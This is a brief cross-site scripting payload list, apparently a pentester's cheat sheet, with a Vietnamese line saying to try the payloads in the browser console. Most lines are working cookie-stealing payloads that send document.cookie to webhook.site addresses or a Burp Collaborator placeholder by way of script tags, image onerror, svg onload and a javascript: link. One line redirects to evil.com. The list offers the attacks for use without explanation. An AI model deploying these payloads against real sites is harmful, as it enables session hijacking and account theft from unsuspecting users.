```
[XSS](javascript:window.onerror=window.location='https://webhook.site/09731cdb-80b0-47e8-a057-f86e939f1ad9?'+document.cookie)
<script>new Image().src="https://webhook.site/15665075-b653-4dc7-bdc2-10b1ace815cf?cookie="+document.cookie</script>
<script>fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
<script>alert("XSS")</script>
<script>window.location.href="https://evil.com"</script>
<img src=x onerror=fetch(https://webhook.site/9732d27f-16f7-436b-8d51-a00b937bb?${document.cookie})/>
<svg/onload=fetch("https://webhook.site/15665075-b653-4dc7-bdc2-10b1ace815cf?c="%2Bdocument.cookie)>
```
# Sử dụng console trên browser để lab playload